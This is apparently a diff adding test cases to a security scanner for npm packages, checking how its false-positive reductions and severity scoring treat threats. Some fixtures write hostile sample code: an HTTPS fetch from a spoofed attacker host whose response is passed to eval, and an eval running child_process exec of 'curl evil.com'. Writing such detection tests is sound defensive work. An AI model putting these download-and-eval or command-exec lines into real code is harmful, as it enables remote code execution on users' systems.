@@ -1497,6 +1497,218 @@ async function runMediumFix34Tests() {
 }
 
 // ===================================================================
+// AUDIT SCORING HARDENING (post-audit fixes)
+// ===================================================================
+async function runAuditScoringTests() {
+  console.log('\n=== AUDIT SCORING HARDENING ===\n');
+
+  const { applyFPReductions } = require('../../src/scoring.js');
+
+  // --- Fix 1.1: SAFE_FETCH_DOMAINS hostname check ---
+
+  await asyncTest('AUDIT-S1: SAFE_FETCH_DOMAINS rejects spoofed subdomain', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-audit-s1a-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"test-s1a","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'index.js'), `
+const https = require('https');
+// Fetch from evil domain that embeds safe domain as substring
+https.get('https://evil-registry.npmjs.org.attacker.com/payload', (res) => {
+  let data = '';
+  res.on('data', d => data += d);
+  res.on('end', () => eval(data));
+});
+`);
+      const result = await runScanDirect(tmpDir);
+      const hasHighEval = result.threats.some(t =>
+        t.type === 'dangerous_call_eval' && t.severity !== 'LOW');
+      assert(hasHighEval, 'Should detect eval with dynamic expression (spoofed domain not marked safe)');
+    } finally { fs.rmSync(tmpDir, { recursive: true, force: true }); }
+  });
+
+  await asyncTest('AUDIT-S1: SAFE_FETCH_DOMAINS accepts legit registry URL', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-audit-s1b-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"test-s1b","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'index.js'), `
+const https = require('https');
+https.get('https://registry.npmjs.org/express/-/express-4.18.2.tgz', (res) => {
+  res.pipe(require('fs').createWriteStream('/tmp/pkg.tgz'));
+});
+`);
+      const result = await runScanDirect(tmpDir);
+      // Should not trigger download_exec_binary because fetch is to safe domain
+      const hasBinaryDropper = result.threats.some(t => t.type === 'download_exec_binary');
+      assert(!hasBinaryDropper, 'Should not flag download from registry.npmjs.org as binary dropper');
+    } finally { fs.rmSync(tmpDir, { recursive: true, force: true }); }
+  });
+
+  // --- Fix 1.3: Plugin loader threshold ---
+
+  test('AUDIT-S3: Plugin loader with 2 patterns does NOT trigger downgrade', () => {
+    const threats = [
+      { type: 'dynamic_require', severity: 'HIGH', file: 'a.js', message: 'dynamic require' },
+      { type: 'dynamic_import', severity: 'HIGH', file: 'b.js', message: 'dynamic import' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'HIGH', 'dynamic_require should stay HIGH with only 2 patterns');
+    assert(threats[1].severity === 'HIGH', 'dynamic_import should stay HIGH with only 2 patterns');
+  });
+
+  // --- Fix 2.1: Dist downgrade 1-notch + DIST_EXEMPT_TYPES ---
+
+  test('AUDIT-S4: Dist file CRITICAL downgraded to HIGH (1-notch, not MEDIUM)', () => {
+    const threats = [
+      { type: 'dangerous_call_eval', severity: 'CRITICAL', file: 'dist/index.js', message: 'eval' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'HIGH',
+      `CRITICAL in dist/ should become HIGH (1-notch), got ${threats[0].severity}`);
+  });
+
+  test('AUDIT-S4: Dist file HIGH downgraded to MEDIUM (1-notch)', () => {
+    const threats = [
+      { type: 'dynamic_require', severity: 'HIGH', file: 'build/loader.js', message: 'dr' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'MEDIUM',
+      `HIGH in build/ should become MEDIUM (1-notch), got ${threats[0].severity}`);
+  });
+
+  test('AUDIT-S4: zlib_inflate_eval exempt from dist downgrade', () => {
+    const threats = [
+      { type: 'zlib_inflate_eval', severity: 'CRITICAL', file: 'dist/payload.min.js', message: 'zlib+eval' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'CRITICAL',
+      `zlib_inflate_eval in dist/ should stay CRITICAL (exempt), got ${threats[0].severity}`);
+  });
+
+  test('AUDIT-S4: cross_file_dataflow exempt from dist downgrade', () => {
+    const threats = [
+      { type: 'cross_file_dataflow', severity: 'CRITICAL', file: 'dist/exfil.js', message: 'cred→net' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'CRITICAL',
+      `cross_file_dataflow in dist/ should stay CRITICAL (exempt), got ${threats[0].severity}`);
+  });
+
+  test('AUDIT-S4: staged_eval_decode exempt from dist downgrade', () => {
+    const threats = [
+      { type: 'staged_eval_decode', severity: 'CRITICAL', file: 'dist/bundle.js', message: 'eval+atob' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'CRITICAL',
+      `staged_eval_decode in dist/ should stay CRITICAL (exempt), got ${threats[0].severity}`);
+  });
+
+  test('AUDIT-S3: Plugin loader with 5+ patterns triggers downgrade', () => {
+    const threats = [
+      { type: 'dynamic_require', severity: 'HIGH', file: 'a.js', message: 'dr1' },
+      { type: 'dynamic_require', severity: 'HIGH', file: 'b.js', message: 'dr2' },
+      { type: 'dynamic_require', severity: 'HIGH', file: 'c.js', message: 'dr3' },
+      { type: 'dynamic_import', severity: 'HIGH', file: 'd.js', message: 'di1' },
+      { type: 'dynamic_import', severity: 'HIGH', file: 'e.js', message: 'di2' }
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'LOW', 'dynamic_require should be LOW with 5 combined patterns');
+    assert(threats[3].severity === 'LOW', 'dynamic_import should be LOW with 5 combined patterns');
+  });
+
+  // --- Fix 2.2: suspicious_dataflow percentage guard ---
+
+  test('AUDIT-S5: suspicious_dataflow at 100% ratio NOT downgraded (>80% guard)', () => {
+    const threats = [
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'a.js', message: 'cred→net' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'b.js', message: 'cred→net' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'c.js', message: 'cred→net' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'd.js', message: 'cred→net' }
+    ];
+    applyFPReductions(threats, null, null);
+    // 4/4 = 100% ratio, above 80% — should NOT be downgraded
+    const hasCritical = threats.some(t => t.severity === 'CRITICAL');
+    assert(hasCritical, 'suspicious_dataflow at 100% ratio should keep CRITICAL (>80% guard)');
+  });
+
+  test('AUDIT-S5: suspicious_dataflow at 33% ratio IS downgraded', () => {
+    const threats = [
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'a.js', message: 'cred→net' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'b.js', message: 'cred→net' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'c.js', message: 'cred→net' },
+      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'd.js', message: 'cred→net' },
+      { type: 'dynamic_require', severity: 'HIGH', file: 'e.js', message: 'dr1' },
+      { type: 'dynamic_require', severity: 'HIGH', file: 'f.js', message: 'dr2' },
+      { type: 'dynamic_require', severity: 'HIGH', file: 'g.js', message: 'dr3' },
+      { type: 'dynamic_require', severity: 'HIGH', file: 'h.js', message: 'dr4' },
+      { type: 'env_access', severity: 'MEDIUM', file: 'i.js', message: 'env' },
+      { type: 'env_access', severity: 'MEDIUM', file: 'j.js', message: 'env' },
+      { type: 'env_access', severity: 'MEDIUM', file: 'k.js', message: 'env' },
+      { type: 'env_access', severity: 'MEDIUM', file: 'l.js', message: 'env' }
+    ];
+    applyFPReductions(threats, null, null);
+    // 4/12 = 33% ratio, below 80% — should be downgraded to LOW
+    const allLow = threats.filter(t => t.type === 'suspicious_dataflow').every(t => t.severity === 'LOW');
+    assert(allLow, 'suspicious_dataflow at 33% ratio should be downgraded to LOW');
+  });
+
+  // --- Fix 2.3: eval string literal content inspection ---
+
+  await asyncTest('AUDIT-S6: eval with dangerous API in string literal → HIGH', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-audit-s6a-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"test-s6a","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'index.js'),
+        'eval(\'require("child_process").exec("curl evil.com")\');\n');
+      const result = await runScanDirect(tmpDir);
+      const evalThreat = result.threats.find(t => t.type === 'dangerous_call_eval');
+      assert(evalThreat, 'Should detect eval with string literal');
+      assert(evalThreat.severity === 'HIGH',
+        `eval with dangerous API in literal should be HIGH, got ${evalThreat.severity}`);
+    } finally { fs.rmSync(tmpDir, { recursive: true, force: true }); }
+  });
+
+  await asyncTest('AUDIT-S6: eval("this") stays LOW (safe polyfill)', async () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-audit-s6b-'));
+    try {
+      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"test-s6b","version":"1.0.0"}');
+      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'var g = eval("this");\n');
+      const result = await runScanDirect(tmpDir);
+      const evalThreat = result.threats.find(t => t.type === 'dangerous_call_eval');
+      assert(evalThreat, 'Should detect eval');
+      assert(evalThreat.severity === 'LOW',
+        `eval("this") should stay LOW, got ${evalThreat.severity}`);
+    } finally { fs.rmSync(tmpDir, { recursive: true, force: true }); }
+  });
+
+  // --- Fix 2.4: HTTP prototype regex narrowed ---
+
+  test('AUDIT-S7: HTTP proto regex does NOT match getCredentials', () => {
+    const threats = [
+      { type: 'prototype_hook', severity: 'HIGH', file: 'a.js', message: 'SomeClass.prototype.getCredentials overridden' },
+      // Pad to >20 prototype_hook hits
+      ...Array.from({ length: 20 }, (_, i) => ({
+        type: 'prototype_hook', severity: 'MEDIUM', file: `f${i}.js`, message: `Class.prototype.m${i}`
+      }))
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'HIGH',
+      `getCredentials should NOT match HTTP proto regex, got ${threats[0].severity}`);
+  });
+
+  test('AUDIT-S7: HTTP proto regex DOES match Request.prototype', () => {
+    const threats = [
+      { type: 'prototype_hook', severity: 'HIGH', file: 'a.js', message: 'Request.prototype.send overridden' },
+      ...Array.from({ length: 20 }, (_, i) => ({
+        type: 'prototype_hook', severity: 'MEDIUM', file: `f${i}.js`, message: `Class.prototype.m${i}`
+      }))
+    ];
+    applyFPReductions(threats, null, null);
+    assert(threats[0].severity === 'MEDIUM',
+      `Request.prototype should match HTTP proto regex and downgrade to MEDIUM, got ${threats[0].severity}`);
+  });
+}
+
+// ===================================================================
 // EXPORT
 // ===================================================================
 async function runAuditFixTests() {
@@ -1534,6 +1746,8 @@ async function runAuditFixTests() {
   await runMediumFix32Tests();
   await runMediumFix33Tests();
   await runMediumFix34Tests();
+  // Audit scoring hardening
+  await runAuditScoringTests();
 }
 
 module.exports = { runAuditFixTests };
